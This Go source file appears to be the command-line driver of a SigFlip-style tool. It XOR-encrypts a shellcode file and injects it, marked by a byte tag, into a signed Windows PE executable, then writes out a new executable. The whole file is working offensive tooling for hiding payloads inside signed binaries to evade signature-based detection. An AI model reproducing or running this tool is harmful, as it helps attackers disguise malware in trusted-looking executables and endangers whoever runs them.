package main

import (
	"flag"
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/akkuman/gSigFlip"
)

var (
	outFilepath string
	peFilepath string
	xorKey string
	shellcodeFilepath string
	tag string
	letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
)

func randStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func parseTagToBytes(tagStr string) []byte {
	tagStr = strings.Replace(tagStr, ` \x`, " ", -1)
	tagStr = strings.Replace(tagStr, `\x`, " ", -1)
	tagStr = strings.Replace(tagStr, `, `, " ", -1)
	tagStr = strings.TrimSpace(tagStr)
	tagSplit := strings.Split(tagStr, " ")
	data := make([]byte, len(tagSplit))
	for i := range tagSplit {
		cByte, err := strconv.ParseUint(tagSplit[i], 16, 8)
		if err != nil {
			panic(err)
		}
		data[i] = byte(cByte)
	}
	return data
}

func init() {
	rand.Seed(time.Now().UnixNano())
	flag.StringVar(&outFilepath, "out", "out.exe", "output pe file path")
	flag.StringVar(&peFilepath, "pe", "", "pe file path which you want ot hide data")
	flag.StringVar(&shellcodeFilepath, "sf", "", "the path of the file where shellcode is stored")
	flag.StringVar(&xorKey, "xor", "", "the xor key you want to use")
	flag.StringVar(&tag, "tag", `fe ed fa ce fe ed fa ce`,
		`the tag you want to use, support "\x1a \xdf" "\x1a\xdf" "1a, df" "1a df"`,
	)
}

func main() {
	flag.Parse()
	if peFilepath == "" || shellcodeFilepath == "" {
		fmt.Println("param pe and sf must be set")
		return
	}
	if xorKey == "" {
		xorKey = randStringRunes(8)
	}
	f, err := os.Open(peFilepath)
	if err != nil {
		fmt.Println(err)
		return
	}
	shellcodeBytes, err := os.ReadFile(shellcodeFilepath)
	if err != nil {
		fmt.Println(err)
		return
	}
	tempPEBytes, err := gSigFlip.Inject(f, shellcodeBytes, parseTagToBytes(tag), []byte(xorKey))
	if err != nil {
		fmt.Println(err)
		return
	}
	err = os.WriteFile(outFilepath, tempPEBytes, 0777)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("generate %s successfully\n", outFilepath)
}
